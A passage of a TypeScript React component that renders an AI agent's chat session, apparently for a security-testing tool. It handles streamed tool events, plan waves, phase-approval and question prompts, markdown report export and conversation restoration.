          id: `wave-${Date.now()}-${itemIdCounter.current++}`,
          timestamp: new Date(),
          wave_id: message.payload.wave_id,
          plan_rationale: message.payload.plan_rationale || '',
          tool_count: message.payload.tool_count,
          tools: [],
          status: 'running',
        }
        setChatItems(prev => [...prev, waveItem])
        setIsLoading(true)
        break
      }

      case MessageType.TOOL_START: {
        const wave_id = message.payload.wave_id
        if (wave_id) {
          // Nest tool inside matching PlanWaveItem
          const nestedTool: ToolExecutionItem = {
            type: 'tool_execution',
            id: `tool-${Date.now()}-${itemIdCounter.current++}`,
            timestamp: new Date(),
            tool_name: message.payload.tool_name,
            tool_args: message.payload.tool_args,
            status: 'running',
            output_chunks: [],
          }
          setChatItems(prev => {
            const waveIndex = prev.findIndex(
              item => item.type === 'plan_wave' && (item as PlanWaveItem).wave_id === wave_id
            )
            if (waveIndex !== -1) {
              const waveItem = prev[waveIndex] as PlanWaveItem
              return [
                ...prev.slice(0, waveIndex),
                { ...waveItem, tools: [...waveItem.tools, nestedTool] },
                ...prev.slice(waveIndex + 1),
              ]
            }
            // Fallback: add as standalone if wave not found
            return [...prev, nestedTool]
          })
        } else {
          // Standard single-tool execution
          const toolItem: ToolExecutionItem = {
            type: 'tool_execution',
            id: `tool-${Date.now()}-${itemIdCounter.current++}`,
            timestamp: new Date(),
            tool_name: message.payload.tool_name,
            tool_args: message.payload.tool_args,
            status: 'running',
            output_chunks: [],
          }
          setChatItems(prev => [...prev, toolItem])
        }
        setIsLoading(true)
        break
      }

      case MessageType.TOOL_OUTPUT_CHUNK: {
        const chunkWaveId = message.payload.wave_id
        setChatItems(prev => {
          if (chunkWaveId) {
            // Find tool inside PlanWaveItem
            const waveIndex = prev.findIndex(
              item => item.type === 'plan_wave' && (item as PlanWaveItem).wave_id === chunkWaveId
            )
            if (waveIndex !== -1) {
              const waveItem = prev[waveIndex] as PlanWaveItem
              const toolIdx = waveItem.tools.findIndex(
                t => t.tool_name === message.payload.tool_name && t.status === 'running'
              )
              if (toolIdx !== -1) {
                const updatedTools = [...waveItem.tools]
                updatedTools[toolIdx] = {
                  ...updatedTools[toolIdx],
                  output_chunks: [...updatedTools[toolIdx].output_chunks, message.payload.chunk],
                }
                return [
                  ...prev.slice(0, waveIndex),
                  { ...waveItem, tools: updatedTools },
                  ...prev.slice(waveIndex + 1),
                ]
              }
            }
            return prev
          }
          // Standard single-tool chunk
          const toolIndex = prev.findIndex(
            item => 'type' in item &&
                    item.type === 'tool_execution' &&
                    item.tool_name === message.payload.tool_name &&
                    item.status === 'running'
          )
          if (toolIndex !== -1) {
            const toolItem = prev[toolIndex] as ToolExecutionItem
            return [
              ...prev.slice(0, toolIndex),
              {
                ...toolItem,
                output_chunks: [...toolItem.output_chunks, message.payload.chunk],
              },
              ...prev.slice(toolIndex + 1)
            ]
          }
          return prev
        })
        break
      }

      case MessageType.TOOL_COMPLETE: {
        const completeWaveId = message.payload.wave_id
        if (completeWaveId) {
          // Update tool inside PlanWaveItem — do NOT setIsLoading(false), wait for PLAN_COMPLETE
          setChatItems(prev => {
            const waveIndex = prev.findIndex(
              item => item.type === 'plan_wave' && (item as PlanWaveItem).wave_id === completeWaveId
            )
            if (waveIndex !== -1) {
              const waveItem = prev[waveIndex] as PlanWaveItem
              const toolIdx = waveItem.tools.findIndex(
                t => t.tool_name === message.payload.tool_name && t.status === 'running'
              )
              if (toolIdx !== -1) {
                const updatedTools = [...waveItem.tools]
                const toolItem = updatedTools[toolIdx]
                const elapsed = Date.now() - toolItem.timestamp.getTime()
                updatedTools[toolIdx] = {
                  ...toolItem,
                  status: message.payload.success ? 'success' : 'error',
                  final_output: message.payload.output_summary,
                  actionable_findings: message.payload.actionable_findings || [],
                  recommended_next_steps: message.payload.recommended_next_steps || [],
                  duration: elapsed,
                }
                return [
                  ...prev.slice(0, waveIndex),
                  { ...waveItem, tools: updatedTools },
                  ...prev.slice(waveIndex + 1),
                ]
              }
            }
            return prev
          })
        } else {
          // Standard single-tool completion
          setChatItems(prev => {
            const toolIndex = prev.findIndex(
              item => 'type' in item &&
                      item.type === 'tool_execution' &&
                      item.tool_name === message.payload.tool_name &&
                      item.status === 'running'
            )
            if (toolIndex !== -1) {
              const toolItem = prev[toolIndex] as ToolExecutionItem
              const elapsed = Date.now() - toolItem.timestamp.getTime()
              const updatedItem: ToolExecutionItem = {
                ...toolItem,
                status: message.payload.success ? 'success' : 'error',
                final_output: message.payload.output_summary,
                actionable_findings: message.payload.actionable_findings || [],
                recommended_next_steps: message.payload.recommended_next_steps || [],
                duration: elapsed,
              }
              return [
                ...prev.slice(0, toolIndex),
                updatedItem,
                ...prev.slice(toolIndex + 1)
              ]
            }
            return prev
          })
          setIsLoading(false)
        }
        break
      }

      case MessageType.PLAN_COMPLETE: {
        // Mark wave as complete and set final status
        // Do NOT setIsLoading(false) — think_node still needs to analyze wave outputs
        // (the LLM call takes seconds). Loading state will be managed by THINKING/RESPONSE events.
        setChatItems((prev: ChatItem[]) => {
          const waveIndex = prev.findIndex(
            (item: ChatItem) => item.type === 'plan_wave' && (item as PlanWaveItem).wave_id === message.payload.wave_id
          )
          if (waveIndex !== -1) {
            const waveItem = prev[waveIndex] as PlanWaveItem
            let status: PlanWaveItem['status'] = 'success'
            if (message.payload.failed === message.payload.total_steps) {
              status = 'error'
            } else if (message.payload.failed > 0) {
              status = 'partial'
            }
            return [
              ...prev.slice(0, waveIndex),
              { ...waveItem, status },
              ...prev.slice(waveIndex + 1),
            ]
          }
          return prev
        })
        break
      }

      case MessageType.PLAN_ANALYSIS: {
        // Update PlanWaveItem with analysis from think_node
        setChatItems(prev => {
          const waveIndex = prev.findIndex(
            (item: ChatItem) => 'type' in item && item.type === 'plan_wave' && (item as PlanWaveItem).wave_id === message.payload.wave_id
          )
          if (waveIndex !== -1) {
            const waveItem = prev[waveIndex] as PlanWaveItem
            return [
              ...prev.slice(0, waveIndex),
              {
                ...waveItem,
                interpretation: message.payload.interpretation,
                actionable_findings: message.payload.actionable_findings || [],
                recommended_next_steps: message.payload.recommended_next_steps || [],
              },
              ...prev.slice(waveIndex + 1),
            ]
          }
          return prev
        })
        break
      }

      case MessageType.DEEP_THINK: {
        const deepThinkItem: DeepThinkItem = {
          type: 'deep_think',
          id: `deep-think-${Date.now()}-${itemIdCounter.current++}`,
          timestamp: new Date(),
          trigger_reason: message.payload.trigger_reason,
          analysis: message.payload.analysis,
          iteration: message.payload.iteration,
          phase: message.payload.phase,
        }
        setChatItems(prev => [...prev, deepThinkItem])
        break
      }

      case MessageType.PHASE_UPDATE:
        setCurrentPhase(message.payload.current_phase as Phase)
        setIterationCount(message.payload.iteration_count)
        if (message.payload.attack_path_type) {
          setAttackPathType(message.payload.attack_path_type)
        }
        break

      case MessageType.TODO_UPDATE:
        setTodoList(message.payload.todo_list)
        // Update the last thinking item with the new todo list
        setChatItems(prev => {
          if (prev.length === 0) return prev
          const lastItem = prev[prev.length - 1]
          if ('type' in lastItem && lastItem.type === 'thinking') {
            return [
              ...prev.slice(0, -1),
              { ...lastItem, updated_todo_list: message.payload.todo_list }
            ]
          }
          return prev
        })
        break

      case MessageType.APPROVAL_REQUEST:
        // Ignore duplicate approval requests if we're already awaiting or just processed one
        if (awaitingApprovalRef.current || isProcessingApproval.current) {
          console.log('Ignoring duplicate approval request - already processing')
          break
        }

        console.log('Received approval request:', message.payload)
        awaitingApprovalRef.current = true
        setAwaitingApproval(true)
        setApprovalRequest(message.payload)
        setIsLoading(false)
        break

      case MessageType.QUESTION_REQUEST:
        // Ignore duplicate question requests if we're already awaiting or just processed one
        if (awaitingQuestionRef.current || isProcessingQuestion.current) {
          console.log('Ignoring duplicate question request - already processing')
          break
        }

        console.log('Received question request:', message.payload)
        awaitingQuestionRef.current = true
        setAwaitingQuestion(true)
        setQuestionRequest(message.payload)
        setIsLoading(false)
        break

      case MessageType.RESPONSE:
        // Add agent response message with tier-aware badge
        const tier = message.payload.response_tier || (message.payload.task_complete ? 'full_report' : 'conversational')
        const assistantMessage: Message = {
          type: 'message',
          id: `assistant-${Date.now()}`,
          role: 'assistant',
          content: message.payload.answer,
          phase: message.payload.phase as Phase,
          timestamp: new Date(),
          isReport: tier === 'full_report',
          responseTier: tier,
        }
        setChatItems(prev => [...prev, assistantMessage])
        setIsLoading(false)
        break

      case MessageType.ERROR:
        const errorMessage: Message = {
          type: 'message',
          id: `error-${Date.now()}`,
          role: 'assistant',
          content: 'An error occurred while processing your request.',
          error: message.payload.message,
          timestamp: new Date(),
        }
        setChatItems(prev => [...prev, errorMessage])
        setIsLoading(false)
        break

      case MessageType.TASK_COMPLETE:
        const completeMessage: Message = {
          type: 'message',
          id: `complete-${Date.now()}`,
          role: 'assistant',
          content: message.payload.message,
          phase: message.payload.final_phase as Phase,
          timestamp: new Date(),
        }
        setChatItems(prev => [...prev, completeMessage])
        setIsLoading(false)
        break

      case MessageType.GUIDANCE_ACK:
        // Already shown in chat from handleSend
        break

      case MessageType.STOPPED:
        setIsLoading(false)
        setIsStopped(true)
        setIsStopping(false)
        break

      case MessageType.FILE_READY:
        const fileItem: FileDownloadItem = {
          type: 'file_download',
          id: `file-${Date.now()}`,
          timestamp: new Date(),
          filepath: message.payload.filepath,
          filename: message.payload.filename,
          description: message.payload.description,
          source: message.payload.source,
        }
        setChatItems(prev => [...prev, fileItem])
        break
    }
  }, [todoList])

  // Initialize WebSocket
  const { status, isConnected, reconnectAttempt, sendQuery, sendApproval, sendAnswer, sendGuidance, sendStop, sendResume } = useAgentWebSocket({
    userId: userId || process.env.NEXT_PUBLIC_USER_ID || 'default_user',
    projectId: projectId || process.env.NEXT_PUBLIC_PROJECT_ID || 'default_project',
    sessionId: sessionId || process.env.NEXT_PUBLIC_SESSION_ID || 'default_session',
    enabled: isOpen,
    onMessage: handleWebSocketMessage,
    onError: (error) => {
      // Only show connection errors once, not for every retry
      if (error.message === 'Initial connection failed') {
        const errorMsg: Message = {
          type: 'message',
          id: `error-${Date.now()}`,
          role: 'assistant',
          content: `Failed to connect to agent. Please check that the backend is running at ws://${typeof window !== 'undefined' ? window.location.hostname : 'localhost'}:8090/ws/agent`,
          error: error.message,
          timestamp: new Date(),
        }
        setChatItems(prev => [...prev, errorMsg])
      }
    },
  })

  const handleSend = useCallback(async () => {
    const question = inputValue.trim()
    if (!question || !isConnected || awaitingApproval || awaitingQuestion) return

    // Auto-create conversation on first user message
    if (!conversationId && projectId && userId && sessionId) {
      const conv = await createConversation(sessionId)
      if (conv) {
        setConversationId(conv.id)
        // Title will be set by the backend persistence layer
      }
    }

    if (isLoading) {
      // Agent is working → send as guidance
      const guidanceMessage: Message = {
        type: 'message',
        id: `guidance-${Date.now()}`,
        role: 'user',
        content: question,
        isGuidance: true,
        timestamp: new Date(),
      }
      setChatItems(prev => [...prev, guidanceMessage])
      setInputValue('')
      sendGuidance(question)
      saveMessage('guidance', { content: question, isGuidance: true })
    } else {
      // Normal query
      const userMessage: Message = {
        type: 'message',
        id: `user-${Date.now()}`,
        role: 'user',
        content: question,
        timestamp: new Date(),
      }
      setChatItems(prev => [...prev, userMessage])
      setInputValue('')
      setIsLoading(true)

      // Set title from first user message
      const hasUserMessage = chatItems.some((item: ChatItem) => 'role' in item && item.role === 'user')
      if (!hasUserMessage) {
        updateConvMeta({ title: question.substring(0, 100) })
      }

      try {
        sendQuery(question)
      } catch (error) {
        setIsLoading(false)
      }
    }
  }, [inputValue, isConnected, isLoading, awaitingApproval, awaitingQuestion, sendQuery, sendGuidance, conversationId, projectId, userId, sessionId, createConversation, saveMessage, updateConvMeta, chatItems])

  const handleApproval = useCallback((decision: 'approve' | 'modify' | 'abort') => {
    // Prevent double submission using ref (immediate check, not async state)
    if (!awaitingApproval || isProcessingApproval.current || !awaitingApprovalRef.current) {
      return
    }

    // Mark as processing immediately
    isProcessingApproval.current = true
    awaitingApprovalRef.current = false

    setAwaitingApproval(false)
    setApprovalRequest(null)
    setIsLoading(true)

    // Add decision message
    const decisionMessage: Message = {
      type: 'message',
      id: `decision-${Date.now()}`,
      role: 'user',
      content: decision === 'approve'
        ? 'Approved phase transition'
        : decision === 'modify'
        ? `Modified: ${modificationText}`
        : 'Aborted phase transition',
      timestamp: new Date(),
    }
    setChatItems(prev => [...prev, decisionMessage])

    try {
      sendApproval(decision, decision === 'modify' ? modificationText : undefined)
      setModificationText('')
    } catch (error) {
      setIsLoading(false)
      awaitingApprovalRef.current = false
      isProcessingApproval.current = false
    } finally {
      // Reset the processing flag after a delay to prevent backend from sending duplicate
      setTimeout(() => {
        isProcessingApproval.current = false
      }, 1000)
    }
  }, [modificationText, sendApproval, awaitingApproval])

  const handleAnswer = useCallback(() => {
    // Prevent double submission using ref (immediate check, not async state)
    if (!awaitingQuestion || isProcessingQuestion.current || !awaitingQuestionRef.current) {
      return
    }

    if (!questionRequest) return

    // Mark as processing immediately
    isProcessingQuestion.current = true
    awaitingQuestionRef.current = false

    setAwaitingQuestion(false)
    setQuestionRequest(null)
    setIsLoading(true)

    const answer = questionRequest.format === 'text'
      ? answerText
      : selectedOptions.join(', ')

    // Add answer message
    const answerMessage: Message = {
      type: 'message',
      id: `answer-${Date.now()}`,
      role: 'user',
      content: `Answer: ${answer}`,
      timestamp: new Date(),
    }
    setChatItems(prev => [...prev, answerMessage])

    try {
      sendAnswer(answer)
      setAnswerText('')
      setSelectedOptions([])
    } catch (error) {
      setIsLoading(false)
      awaitingQuestionRef.current = false
      isProcessingQuestion.current = false
    } finally {
      // Reset the processing flag after a delay to prevent backend from sending duplicate
      setTimeout(() => {
        isProcessingQuestion.current = false
      }, 1000)
    }
  }, [questionRequest, answerText, selectedOptions, sendAnswer, awaitingQuestion])

  const handleStop = useCallback(() => {
    setIsStopping(true)
    sendStop()
  }, [sendStop])

  const handleResume = useCallback(() => {
    sendResume()
    setIsStopped(false)
    setIsStopping(false)
    setIsLoading(true)
  }, [sendResume])

  const handleKeyDown = (e: KeyboardEvent<HTMLTextAreaElement>) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault()
      handleSend()
    }
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    setInputValue(e.target.value)
    e.target.style.height = 'auto'
    e.target.style.height = `${Math.min(e.target.scrollHeight, 120)}px`
  }

  const handleDownloadMarkdown = useCallback(() => {
    if (chatItems.length === 0) return

    const timestamp = new Date().toISOString().replace(/[:.]/g, '-')
    const lines: string[] = []

    // Header
    lines.push('# AI Agent Session Report')
    lines.push('')
    lines.push(`**Date:** ${new Date().toLocaleString()}  `)
    lines.push(`**Phase:** ${PHASE_CONFIG[currentPhase].label}  `)
    if (iterationCount > 0) lines.push(`**Step:** ${iterationCount}  `)
    if (modelName) lines.push(`**Model:** ${formatModelDisplay(modelName)}  `)
    lines.push('')
    lines.push('---')
    lines.push('')

    // Todo list snapshot
    if (todoList.length > 0) {
      lines.push('## Task List')
      lines.push('')
      todoList.forEach((item: TodoItem) => {
        const icon = item.status === 'completed' ? '[x]' : item.status === 'in_progress' ? '[-]' : '[ ]'
        const desc = item.description || item.content || item.activeForm || 'No description'
        lines.push(`- ${icon} ${desc}`)
      })
      lines.push('')
      lines.push('---')
      lines.push('')
    }

    // Chat timeline
    lines.push('## Session Timeline')
    lines.push('')

    chatItems.forEach(item => {
      if ('role' in item) {
        // Message
        const time = item.timestamp.toLocaleTimeString()
        if (item.role === 'user') {
          lines.push(`### User  \`${time}\``)
          if (item.isGuidance) lines.push('> *[Guidance]*')
        } else {
          lines.push(`### Assistant  \`${time}\``)
          if (item.responseTier === 'full_report') lines.push('> **[Report]**')
          else if (item.responseTier === 'summary') lines.push('> **[Summary]**')
        }
        lines.push('')
        lines.push(item.content)
        lines.push('')
        if (item.error) {
          lines.push(`> **Error:** ${item.error}`)
          lines.push('')
        }
        lines.push('---')
        lines.push('')
      } else if (item.type === 'thinking') {
        const time = item.timestamp.toLocaleTimeString()
        lines.push(`### Thinking  \`${time}\``)
        lines.push('')
        if (item.thought) {
          lines.push(`> ${item.thought}`)
          lines.push('')
        }
        if (item.reasoning) {
          lines.push('<details>')
          lines.push('<summary>Reasoning</summary>')
          lines.push('')
          lines.push(item.reasoning)
          lines.push('')
          lines.push('</details>')
          lines.push('')
        }
        if (item.updated_todo_list && item.updated_todo_list.length > 0) {
          lines.push('<details>')
          lines.push('<summary>Todo List Update</summary>')
          lines.push('')
          item.updated_todo_list.forEach(todo => {
            const icon = todo.status === 'completed' ? '[x]' : todo.status === 'in_progress' ? '[-]' : '[ ]'
            const desc = todo.description || todo.content || todo.activeForm || ''
            lines.push(`- ${icon} ${desc}`)
          })
          lines.push('')
          lines.push('</details>')
          lines.push('')
        }
        lines.push('---')
        lines.push('')
      } else if (item.type === 'deep_think') {
        const time = item.timestamp.toLocaleTimeString()
        lines.push(`### Deep Think  \`${time}\``)
        lines.push('')
        lines.push(`> **Trigger:** ${item.trigger_reason}`)
        lines.push('')
        if (item.analysis) {
          lines.push(item.analysis)
          lines.push('')
        }
        lines.push('---')
        lines.push('')
      } else if (item.type === 'tool_execution') {
        const time = item.timestamp.toLocaleTimeString()
        const statusIcon = item.status === 'success' ? 'OK' : item.status === 'error' ? 'FAIL' : 'RUNNING'
        lines.push(`### Tool: \`${item.tool_name}\`  \`${time}\`  [${statusIcon}]`)
        lines.push('')

        // Arguments
        if (item.tool_args && Object.keys(item.tool_args).length > 0) {
          lines.push('**Arguments**')
          lines.push('')
          Object.entries(item.tool_args).forEach(([key, value]) => {
            lines.push(`- **${key}:** \`${typeof value === 'string' ? value : JSON.stringify(value)}\``)
          })
          lines.push('')
        }

        // Raw Output
        const rawOutput = item.output_chunks.join('')
        if (rawOutput) {
          lines.push('<details>')
          lines.push('<summary>Raw Output</summary>')
          lines.push('')
          lines.push('```')
          lines.push(rawOutput)
          lines.push('```')
          lines.push('')
          lines.push('</details>')
          lines.push('')
        }

        // Analysis
        if (item.final_output) {
          lines.push('**Analysis**')
          lines.push('')
          lines.push(item.final_output)
          lines.push('')
        }

        // Actionable Findings
        if (item.actionable_findings && item.actionable_findings.length > 0) {
          lines.push('**Actionable Findings**')
          lines.push('')
          item.actionable_findings.forEach(f => lines.push(`- ${f}`))
          lines.push('')
        }

        // Recommended Next Steps
        if (item.recommended_next_steps && item.recommended_next_steps.length > 0) {
          lines.push('**Recommended Next Steps**')
          lines.push('')
          item.recommended_next_steps.forEach(s => lines.push(`- ${s}`))
          lines.push('')
        }

        lines.push('---')
        lines.push('')
      } else if (item.type === 'plan_wave') {
        const waveItem = item as PlanWaveItem
        const time = waveItem.timestamp.toLocaleTimeString()
        const statusIcon = waveItem.status === 'success' ? 'OK' : waveItem.status === 'error' ? 'FAIL' : waveItem.status === 'partial' ? 'PARTIAL' : 'RUNNING'
        lines.push(`### Wave — ${waveItem.tool_count} tools  \`${time}\`  [${statusIcon}]`)
        lines.push('')
        if (waveItem.plan_rationale) {
          lines.push(`> ${waveItem.plan_rationale}`)
          lines.push('')
        }
        // Export each nested tool
        waveItem.tools.forEach(tool => {
          const toolStatusIcon = tool.status === 'success' ? 'OK' : tool.status === 'error' ? 'FAIL' : 'RUNNING'
          lines.push(`#### Tool: \`${tool.tool_name}\`  [${toolStatusIcon}]`)
          lines.push('')
          if (tool.tool_args && Object.keys(tool.tool_args).length > 0) {
            lines.push('**Arguments**')
            lines.push('')
            Object.entries(tool.tool_args).forEach(([key, value]) => {
              lines.push(`- **${key}:** \`${typeof value === 'string' ? value : JSON.stringify(value)}\``)
            })
            lines.push('')
          }
          const rawOutput = tool.output_chunks.join('')
          if (rawOutput) {
            lines.push('<details>')
            lines.push('<summary>Raw Output</summary>')
            lines.push('')
            lines.push('```')
            lines.push(rawOutput)
            lines.push('```')
            lines.push('')
            lines.push('</details>')
            lines.push('')
          }
          if (tool.final_output) {
            lines.push('**Analysis**')
            lines.push('')
            lines.push(tool.final_output)
            lines.push('')
          }
          if (tool.actionable_findings && tool.actionable_findings.length > 0) {
            lines.push('**Actionable Findings**')
            lines.push('')
            tool.actionable_findings.forEach(f => lines.push(`- ${f}`))
            lines.push('')
          }
          if (tool.recommended_next_steps && tool.recommended_next_steps.length > 0) {
            lines.push('**Recommended Next Steps**')
            lines.push('')
            tool.recommended_next_steps.forEach(s => lines.push(`- ${s}`))
            lines.push('')
          }
        })
        // Wave-level analysis
        if (waveItem.interpretation) {
          lines.push('**Analysis**')
          lines.push('')
          lines.push(waveItem.interpretation)
          lines.push('')
        }
        if (waveItem.actionable_findings && waveItem.actionable_findings.length > 0) {
          lines.push('**Actionable Findings**')
          lines.push('')
          waveItem.actionable_findings.forEach(f => lines.push(`- ${f}`))
          lines.push('')
        }
        if (waveItem.recommended_next_steps && waveItem.recommended_next_steps.length > 0) {
          lines.push('**Recommended Next Steps**')
          lines.push('')
          waveItem.recommended_next_steps.forEach(s => lines.push(`- ${s}`))
          lines.push('')
        }
        lines.push('---')
        lines.push('')
      } else if (item.type === 'file_download') {
        const time = item.timestamp.toLocaleTimeString()
        lines.push(`### File Download  \`${time}\``)
        lines.push('')
        lines.push(`- **File:** ${item.filename}`)
        lines.push(`- **Path:** \`${item.filepath}\``)
        lines.push(`- **Source:** ${item.source}`)
        lines.push(`- **Description:** ${item.description}`)
        lines.push('')
        lines.push('---')
        lines.push('')
      }
    })

    // Download
    const blob = new Blob([lines.join('\n')], { type: 'text/markdown;charset=utf-8' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `redamon-session-${timestamp}.md`
    a.click()
    URL.revokeObjectURL(url)
  }, [chatItems, currentPhase, iterationCount, modelName, todoList])

  const handleNewChat = useCallback(() => {
    // Don't stop the running agent — let it continue in background
    // and persist messages via the backend persistence layer
    setChatItems([])
    setCurrentPhase('informational')
    setAttackPathType('')
    setIterationCount(0)
    setAwaitingApproval(false)
    setApprovalRequest(null)
    setAwaitingQuestion(false)
    setQuestionRequest(null)
    setAnswerText('')
    setSelectedOptions([])
    setTodoList([])
    setIsStopped(false)
    setIsLoading(false)
    awaitingApprovalRef.current = false
    isProcessingApproval.current = false
    awaitingQuestionRef.current = false
    isProcessingQuestion.current = false
    shouldAutoScroll.current = true
    setConversationId(null)
    setShowHistory(false)
    onResetSession?.()
  }, [onResetSession])

  // Switch to a different conversation from history
  const handleSelectConversation = useCallback(async (conv: Conversation) => {
    const full = await loadConversation(conv.id)
    if (!full) return

    // Restore chat items from persisted messages
    let lastTodoList: TodoItem[] = []
    let lastApprovalRequest: any = null
    let lastQuestionRequest: any = null
    let lastRenderedPhase: string = ''
    let lastAttackPathType: string = ''
    // Track whether the agent did actual WORK after the last approval/question.
    // assistant_message doesn't count (it's the phase transition description that
    // arrives alongside the approval_request). Only thinking/tool_start indicate
    // the user already responded and the agent continued.
    let hasWorkAfterApproval = false
    let hasWorkAfterQuestion = false

    // Count tool_complete per tool_name so we can pair them with tool_start.
    // Only unpaired tool_start (no remaining tool_complete) creates a fallback card.
    const toolCompleteCounts = new Map<string, number>()
    for (const msg of full.messages) {
      if (msg.type === 'tool_complete') {
        const name = (msg.data as any).tool_name || ''
        toolCompleteCounts.set(name, (toolCompleteCounts.get(name) || 0) + 1)
      }
    }
    // Clone so we can decrement as we consume tool_start entries
    const remainingCompletes = new Map(toolCompleteCounts)

    const restored: ChatItem[] = full.messages.map((msg: { id: string; type: string; data: unknown; createdAt: string }) => {
      const data = msg.data as any

      // Track agent work after approval/question requests
      if (msg.type === 'thinking' || msg.type === 'tool_start' || msg.type === 'tool_complete') {
        if (lastApprovalRequest) hasWorkAfterApproval = true
        if (lastQuestionRequest) hasWorkAfterQuestion = true
      }

      if (msg.type === 'user_message' || msg.type === 'assistant_message') {
        const restoredTier = data.response_tier || (data.task_complete ? 'full_report' : undefined)
        return {
          type: 'message',
          id: msg.id,
          role: msg.type === 'user_message' ? 'user' : 'assistant',
          content: data.content || '',
          phase: data.phase,
          timestamp: new Date(msg.createdAt),
          isGuidance: data.isGuidance || false,
          isReport: restoredTier === 'full_report' || (!data.response_tier && (data.isReport || data.task_complete || false)),
          responseTier: restoredTier,
          error: data.error || null,
        } as Message
      } else if (msg.type === 'thinking') {
        return {
          type: 'thinking',
          id: msg.id,
          timestamp: new Date(msg.createdAt),
          thought: data.thought || '',
          reasoning: data.reasoning || '',
          action: 'thinking',
          updated_todo_list: [],
        } as ThinkingItem
      } else if (msg.type === 'tool_start') {
        // Skip wave-owned tool_start — they're nested via post-pass
        if (data.wave_id) return null
        // If a matching tool_complete exists, skip — full data comes from tool_complete
        const toolName = data.tool_name || ''
        const remaining = remainingCompletes.get(toolName) || 0
        if (remaining > 0) {
          remainingCompletes.set(toolName, remaining - 1)
          return null
        }
        // No matching tool_complete — tool was still running or never completed.
        // Show it as a running/incomplete tool card so it's not invisible.
        return {
          type: 'tool_execution',
          id: msg.id,
          timestamp: new Date(msg.createdAt),
          tool_name: data.tool_name || '',
          tool_args: data.tool_args || {},
          status: 'running',
          output_chunks: [],
        } as ToolExecutionItem
      } else if (msg.type === 'tool_complete') {
        // Skip wave-owned tool_complete — they're nested via post-pass
        if (data.wave_id) return null
        // Reconstruct full ToolExecutionItem with raw output and tool_args
        const rawOutput = data.raw_output || ''
        // Find matching tool_start for duration calculation
        const matchingStart = full.messages.find(
          (m: any) => m.type === 'tool_start' && (m.data as any)?.tool_name === data.tool_name
            && !((m.data as any)?.wave_id)
            && new Date(m.createdAt).getTime() < new Date(msg.createdAt).getTime()
        )
        const startTime = matchingStart ? new Date(matchingStart.createdAt) : undefined
        const completeTime = new Date(msg.createdAt)
        const duration = startTime ? completeTime.getTime() - startTime.getTime() : undefined
        return {
          type: 'tool_execution',
          id: msg.id,
          timestamp: startTime || completeTime,
          tool_name: data.tool_name || '',
          tool_args: data.tool_args || {},
          status: data.success ? 'success' : 'error',
          output_chunks: rawOutput ? [rawOutput] : [],
          final_output: data.output_summary,
          actionable_findings: data.actionable_findings || [],
          recommended_next_steps: data.recommended_next_steps || [],
          duration,
        } as ToolExecutionItem
      } else if (msg.type === 'error') {
        return {
          type: 'message',
          id: msg.id,
          role: 'assistant',
          content: 'An error occurred while processing your request.',
          error: data.message,
          timestamp: new Date(msg.createdAt),
        } as Message
      } else if (msg.type === 'task_complete') {
        return {
          type: 'message',
          id: msg.id,
          role: 'assistant',
          content: data.message || '',
          phase: data.final_phase,
          timestamp: new Date(msg.createdAt),
        } as Message
      } else if (msg.type === 'guidance') {
        return {
          type: 'message',
          id: msg.id,
          role: 'user',
          content: data.content || '',
          isGuidance: true,
          timestamp: new Date(msg.createdAt),
        } as Message
      } else if (msg.type === 'file_ready') {
        return {
          type: 'file_download',
          id: msg.id,
          timestamp: new Date(msg.createdAt),
          filepath: data.filepath || '',
          filename: data.filename || '',
          description: data.description || '',
          source: data.source || '',
        } as FileDownloadItem
      } else if (msg.type === 'todo_update') {
        // Track last todo list for state restoration (not a chat item)
        lastTodoList = data.todo_list || []
        return null
      } else if (msg.type === 'phase_update') {
        // Track attack path type for state restoration
        if (data.attack_path_type) lastAttackPathType = data.attack_path_type
        // Only render when phase actually changes (avoid duplicate "Phase: informational" noise)
        const phase = data.current_phase || 'unknown'
        if (phase !== lastRenderedPhase) {
          lastRenderedPhase = phase
          return {
            type: 'message',
            id: msg.id,
            role: 'assistant',
            content: `**Phase:** ${phase}` + (data.iteration_count ? ` — Step ${data.iteration_count}` : ''),
            phase,
            timestamp: new Date(msg.createdAt),
          } as Message
        }
        return null
      } else if (msg.type === 'approval_request') {
        lastApprovalRequest = data
        hasWorkAfterApproval = false
        // Render as an assistant message so it appears in timeline and markdown
        const parts = [`**Phase Transition Request:** ${data.from_phase || '?'} → ${data.to_phase || '?'}`]
        if (data.reason) parts.push(`\n**Reason:** ${data.reason}`)
        if (data.planned_actions?.length) parts.push(`\n**Planned Actions:**\n${data.planned_actions.map((a: string) => `- ${a}`).join('\n')}`)
        if (data.risks?.length) parts.push(`\n**Risks:**\n${data.risks.map((r: string) => `- ${r}`).join('\n')}`)
        return {
          type: 'message',
          id: msg.id,
          role: 'assistant',
          content: parts.join('\n'),
          phase: data.from_phase,
          timestamp: new Date(msg.createdAt),
        } as Message
      } else if (msg.type === 'approval_response') {
        // User's approval decision — render as a user message
        lastApprovalRequest = null
        hasWorkAfterApproval = true
        const label = data.decision === 'approve'
          ? 'Approved phase transition'
          : data.decision === 'modify'
          ? `Modified: ${data.modification || ''}`
          : 'Aborted phase transition'
        return {
          type: 'message',
          id: msg.id,
          role: 'user',
          content: label,
          timestamp: new Date(msg.createdAt),
        } as Message
      } else if (msg.type === 'question_request') {
        lastQuestionRequest = data
        hasWorkAfterQuestion = false
        // Render as an assistant message so it appears in timeline and markdown
        const qParts = [`**Agent Question:** ${data.question || ''}`]
        if (data.context) qParts.push(`\n> ${data.context}`)
        if (data.options?.length) qParts.push(`\n**Options:**\n${data.options.map((o: string) => `- ${o}`).join('\n')}`)
        return {
          type: 'message',
          id: msg.id,
          role: 'assistant',
          content: qParts.join('\n'),
          phase: data.phase,
          timestamp: new Date(msg.createdAt),
        } as Message
      } else if (msg.type === 'answer_response') {
        // User's answer to agent question — render as a user message
        lastQuestionRequest = null
        hasWorkAfterQuestion = true
        return {
          type: 'message',
          id: msg.id,
          role: 'user',
          content: `Answer: ${data.answer || ''}`,
          timestamp: new Date(msg.createdAt),
        } as Message
      } else if (msg.type === 'plan_start') {
        // Create empty PlanWaveItem shell — tools will be populated by tool_complete with wave_id
        return {
          type: 'plan_wave',
          id: msg.id,
          timestamp: new Date(msg.createdAt),
          wave_id: data.wave_id || '',
          plan_rationale: data.plan_rationale || '',
          tool_count: data.tool_count || 0,
          tools: [],
          status: 'running',
        } as PlanWaveItem
      } else if (msg.type === 'deep_think') {
        return {
